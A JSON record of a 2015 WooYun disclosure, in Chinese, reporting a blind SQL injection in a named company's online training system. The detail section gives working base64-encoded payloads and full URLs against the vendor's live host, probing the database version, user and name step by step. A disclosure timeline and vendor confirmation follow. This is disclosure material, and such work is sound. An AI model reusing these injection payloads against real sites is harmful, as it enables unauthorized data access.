{"id": 28923, "wybug_id": "wooyun-2015-0120906", "wybug_title": "某在线培训系统Base64编码后通用SQL盲注漏洞", "wybug_corp": "上海天柏信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-17 12:24", "wybug_open_date": "2015-09-20 09:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向公众公开  简要描述： RT 详细说明：  接上一个洞： WooYun: 某在线培训系统通用SQL注入漏洞 厂商：上海天柏信息科技有限公司http://www.timber2005.com/Product_sy.html （客户案例及试用）天柏在线培训系统（网校版）漏洞地址：http://px2.timber2005.com/WebPage/kc_content.aspx?tid=NDAyMA==&cid=Mjk=参数cid存在注入tid和cid都采用了base64的编码，因此提交的时候需要对参数进行编码提交：\n29 and 1=1\n编码后：\nMjkgYW5kIDE9MQ==\n\n\n页面正常再提交：29 and 1=2 编码：MjkgYW5kIDE9Mg==页面异常，如图\n\n判断为数字型注入。提交：29 order by 8--提示异常：\nhttp://px2.timber2005.com/WebPage/kc_content.aspx?tid=NDAyMA==&cid=Mjkgb3JkZXIgYnkgOC0t\n\nORDER BY 子句中的位置号 8 超过了选择列表中项数目。\n\n\n最终判断出字段是7个，但不能展示查询结果，原因是执行了多次SQL导致的，因此这个注入就需要靠盲注了。盲注入代码：1、判断数据库：提交:\n29 and @@VERSION LIKE '%2000%'--\nURL:http://px2.timber2005.com/WebPage/kc_content.aspx?tid=NDAyMA==&cid=MjkgYW5kIEBAVkVSU0lPTiBMSUtFICclMjAwMCUnLS0=\n\n页面正常，判断为MSSQL 2000的数据库2、判断用户提交：29 and substring(user,1,3)='dbo'编码：MjkgYW5kIHN1YnN0cmluZyh1c2VyLDEsMyk9J2Ribyc=URL：http://px2.timber2005.com/WebPage/kc_content.aspx?tid=NDAyMA==&cid=MjkgYW5kIHN1YnN0cmluZyh1c2VyLDEsMyk9J2Ribyc=页面正常\n\n判断为用户为：dbo3、判断数据库名跟上面类似，因为上一个洞已经跑出过db_name()，所有这里演示就直接测试了提交：29 and substring(db_name(),1,15)='Timber_Exam_Org'编码：http://px2.timber2005.com/WebPage/kc_content.aspx?tid=NDAyMA==&cid=MjkgYW5kIHN1YnN0cmluZyhkYl9uYW1lKCksMSwxNSk9J1RpbWJlcl9FeGFtX09yZyc=页面显示正常，如图\n\n说明数据库是：Timber_Exam_Org反例：如果我提交：29 and substring(db_name(),1,15)='Timber_Exam_Orc'是不正确的信息，那么页面直接异常，http://px2.timber2005.com/WebPage/kc_content.aspx?tid=NDAyMA==&cid=MjkgYW5kIHN1YnN0cmluZyhkYl9uYW1lKCksMSwxNSk9J1RpbWJlcl9FeGFtX09yYyc=如图\n\n其他信息过程类似。。。不一一演示   漏洞证明：  已证明   修复方案：  升级+补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-06-22 09:34 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}